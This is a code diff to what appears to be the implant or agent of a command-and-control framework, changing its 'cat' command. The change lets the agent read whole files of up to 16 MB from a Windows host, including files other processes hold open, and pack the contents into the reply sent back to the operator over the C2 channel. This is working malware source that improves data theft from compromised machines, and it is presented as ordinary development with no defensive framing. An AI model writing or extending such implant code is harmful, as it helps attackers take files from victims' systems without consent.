@@ -145,6 +145,12 @@ void Commander_ProcessCommandTasks(Commander* self, BYTE* recv, ULONG recvSize, 
 		Packer_Destroy(inPacker);
 }
 
+// Soft ceiling for cat: full file by default, but refuse multi-GB dumps that would
+// OOM the agent / blow the C2 frame. Oversized files should use download.
+#ifndef CAT_MAX_BYTES
+#define CAT_MAX_BYTES (16u * 1024u * 1024u)
+#endif
+
 void Commander_CmdCat(Commander* self, ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
@@ -153,18 +159,66 @@ void Commander_CmdCat(Commander* self, ULONG commandId, Packer* inPacker, Packer
 
 	Packer_Pack32(outPacker, taskId);
 
-	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
+	// FILE_SHARE_READ: allow cat while other processes have the file open
+	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
 	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
 		Packer_Pack32(outPacker, COMMAND_ERROR);
 		Packer_Pack32(outPacker, TEB->LastErrorValue);
 		return;
 	}
 
-	DWORD contentSize = 2048;
-	DWORD readed = 0;
-	PVOID content = MemAllocLocal(contentSize);
+	DWORD sizeHigh = 0;
+	DWORD sizeLow  = ApiWin->GetFileSize(hFile, &sizeHigh);
+	// INVALID_FILE_SIZE with non-zero LastError means failure
+	if (sizeLow == INVALID_FILE_SIZE && TEB->LastErrorValue != 0) {
+		Packer_Pack32(outPacker, COMMAND_ERROR);
+		Packer_Pack32(outPacker, TEB->LastErrorValue);
+		ApiNt->NtClose(hFile);
+		return;
+	}
 
-	BOOL result = ApiWin->ReadFile(hFile, content, contentSize, &readed, NULL);
+	ULONG64 fileSize = ((ULONG64)sizeHigh << 32) | (ULONG64)sizeLow;
+	if (fileSize > (ULONG64)CAT_MAX_BYTES) {
+		// Too large for inline cat — operator should use download
+		Packer_Pack32(outPacker, COMMAND_ERROR);
+		Packer_Pack32(outPacker, ERROR_FILE_TOO_LARGE); // 223
+		ApiNt->NtClose(hFile);
+		return;
+	}
+
+	DWORD contentSize = (DWORD)fileSize;
+	DWORD readed = 0;
+	PVOID content = NULL;
+	BOOL result = FALSE;
+
+	if (contentSize == 0) {
+		// empty file: still success with zero-length body
+		result = TRUE;
+		readed = 0;
+	} else {
+		content = MemAllocLocal(contentSize);
+		if (!content) {
+			Packer_Pack32(outPacker, COMMAND_ERROR);
+			Packer_Pack32(outPacker, ERROR_NOT_ENOUGH_MEMORY);
+			ApiNt->NtClose(hFile);
+			return;
+		}
+		// Read full file (loop in case ReadFile returns partial)
+		DWORD offset = 0;
+		result = TRUE;
+		while (offset < contentSize) {
+			DWORD chunk = 0;
+			if (!ApiWin->ReadFile(hFile, (PBYTE)content + offset, contentSize - offset, &chunk, NULL)) {
+				result = FALSE;
+				break;
+			}
+			if (chunk == 0)
+				break;
+			offset += chunk;
+		}
+		readed = offset;
+	}
+
 	if (result) {
 		Packer_Pack32(outPacker, commandId);
 		Packer_PackBytes(outPacker, (PBYTE)path, pathSize);
